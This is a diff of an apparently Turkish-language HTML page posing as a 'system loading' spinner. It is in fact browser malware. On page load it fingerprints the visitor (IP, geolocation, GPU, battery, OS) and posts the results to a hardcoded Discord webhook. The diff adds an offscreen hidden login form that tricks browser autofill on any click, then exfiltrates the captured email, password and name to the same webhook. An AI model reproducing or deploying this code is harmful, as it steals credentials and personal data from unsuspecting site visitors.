@@ -3,85 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Kaynakları</title>
+    <title>Sistem Yükleniyor...</title>
     <style>
-        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
-        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: s 1s linear infinite; }
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; font-family: sans-serif; color: #0f0; }
+        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
         @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* Gizli Form: Kullanıcı görmez ama tarayıcı doldurur */
+        #hidden-form { opacity: 0; position: absolute; top: -1000px; left: -1000px; }
     </style>
 </head>
 <body>
     <div class="l"></div>
 
+    <form id="hidden-form">
+        <input type="email" name="email" id="e" autocomplete="email">
+        <input type="password" name="password" id="p" autocomplete="current-password">
+        <input type="text" name="full-name" id="n" autocomplete="name">
+    </form>
+
     <script>
-        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function masterExtract() {
-            let info = { 
-                gpu: "N/A", ven: "N/A", ip: "X", iss: "X", loc: "X", 
-                net: "X", sys: "X", ext: "X", bat: "X" 
-            };
-
-            // 1. ZORLANMIŞ DONANIM SORGUSU (GPU/VENDOR)
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"}) || canvas.getContext('webgl');
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                if (dbg) {
-                    info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                    info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
-                }
-            } catch(e) {}
-
-            // 2. ISS, IP VE ADLİ KONUM ANALİZİ
+        async function getIPInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                const j = await res.json();
-                info.ip = j.ip;
-                info.iss = `${j.org} (AS${j.asn})`;
-                info.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${info.iss}\`\n🛡️ **Proxy/VPN:** ${j.proxy ? '⚠️ Aktif' : '✅ Temiz'}\n🗺️ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
-            } catch(e) {}
+                return await res.json();
+            } catch { return {}; }
+        }
 
-            // 3. ŞEBEKE VE HIZ
-            try {
-                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                info.net = n ? `⚡ **Hız:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\n📡 **Bağlantı:** ${n.effectiveType}` : "Erişilemedi";
-            } catch(e) {}
-
-            // 4. DERİN SİSTEM VE ZAMAN ANALİZİ
+        async function getBatteryInfo() {
             try {
                 const b = await navigator.getBattery();
-                info.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
-            } catch(e) {}
+                return `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
+            } catch { return "Erişilemedi"; }
+        }
 
-            info.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n💾 **RAM:** ${navigator.deviceMemory || 'Gizli'} GB\n🔋 **Güç:** ${info.bat}`;
-            info.ext = `🌍 **Dil:** ${navigator.language}\n⏰ **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+        function getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
+            } catch { return "N/A"; }
+        }
 
-            // 5. KUSURSUZ RAPOR ŞABLONU
+        async function sendToDiscord(extraData = {}) {
+            const ip = await getIPInfo();
+            const bat = await getBatteryInfo();
+            
             const payload = {
                 embeds: [{
-                    title: "💀 KUSURSUZ ADLİ SİSTEM ANALİZİ",
-                    description: "Kullanıcı etkileşimi olmadan tüm veriler sızdırıldı.",
-                    color: 15158332,
+                    title: "💀 Gelişmiş Sistem ve Autofill Analizi",
+                    color: 0x00ff00,
                     fields: [
-                        { name: "📡 İNTERNET VE ISS KATMANI", value: `${info.loc}\n${info.net}\n**IP:** \`${info.ip}\``, inline: false },
-                        { name: "🛠️ EKRAN KARTI (DONANIM)", value: `**Renderer:** \`${info.gpu}\`\n**Vendor:** \`${info.ven}\``, inline: false },
-                        { name: "⚙️ DONANIM DETAYLARI", value: info.sys, inline: false },
-                        { name: "🌐 SİSTEM DETAYLARI", value: info.ext, inline: false },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
+                        { name: "🌐 Ağ Bilgisi", value: `**IP:** \`${ip.ip || '?'}\`\n**ISS:** ${ip.org || '?'}\n**Konum:** ${ip.city}/${ip.country_name}`, inline: true },
+                        { name: "💻 Donanım", value: `**GPU:** \`${getGPU()}\`\n**OS:** ${navigator.platform}\n**RAM:** ${navigator.deviceMemory || '?'}GB`, inline: true },
+                        { name: "🔋 Pil", value: bat, inline: true },
+                        { name: "🔑 Sızdırılan Veriler", value: `**E-posta:** \`${extraData.email || 'Boş'}\`\n**Şifre:** \`${extraData.pass || 'Boş'}\`\n**İsim:** \`${extraData.name || 'Boş'}\`` }
                     ],
-                    footer: { text: "Protocol: Omniscience v7.0" },
+                    footer: { text: "Protocol: Omniscience v8.0" },
                     timestamp: new Date()
                 }]
             };
 
-            const blob = JSON.stringify(payload);
-            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
-            navigator.sendBeacon(u, blob);
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
         }
 
-        // OTOMATİK BAŞLAT
-        window.onload = masterExtract;
+        // Global Etkileşim Dinleyici
+        document.addEventListener('click', () => {
+            // Kullanıcı tıkladığı an tarayıcıyı doldurmaya zorla
+            document.getElementById('e').focus();
+            
+            // Veri varsa (autofill çalıştıysa) 1 saniye sonra gönder
+            setTimeout(() => {
+                const data = {
+                    email: document.getElementById('e').value,
+                    pass: document.getElementById('p').value,
+                    name: document.getElementById('n').value
+                };
+                if(data.email || data.pass) {
+                    sendToDiscord(data);
+                }
+            }, 1000);
+        });
+
+        // Sayfa açıldığında temel bilgileri hemen gönder
+        window.onload = () => sendToDiscord();
     </script>
 </body>
 </html>
